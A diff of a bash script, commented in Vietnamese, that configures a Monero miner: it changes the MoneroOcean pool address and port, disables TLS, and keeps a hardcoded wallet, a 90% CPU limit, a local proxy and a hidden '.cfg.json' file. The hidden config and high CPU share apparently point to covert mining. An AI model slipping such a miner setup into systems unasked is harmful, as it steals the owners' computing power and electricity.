@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ==== Cấu hình chung ====
-POOL_REAL="ulf.moneroocean.stream:443"
+POOL_REAL="gulf.moneroocean.stream:10128"
 POOL_LOCAL="127.0.0.1:80"
 WALLET="84UznXHBqkhUcsDt7uJGLgMcfZSSfWbkyLgNPoX5TAKk63p9WNwZacNAto4qUJSz1b3pikEWcRwrZ5ZfsSD5iZSK4aHmY6Z"  # 👈 ĐỔI ví tại đây
 CPU_PERCENT=90
@@ -45,7 +45,7 @@ cat > .cfg.json <<EOF
       "url": "$POOL_LOCAL",
       "user": "$WALLET",
       "pass": "$RIG_NAME",
-      "tls": true,
+      "tls": false,
       "keepalive": true
     }
   ]
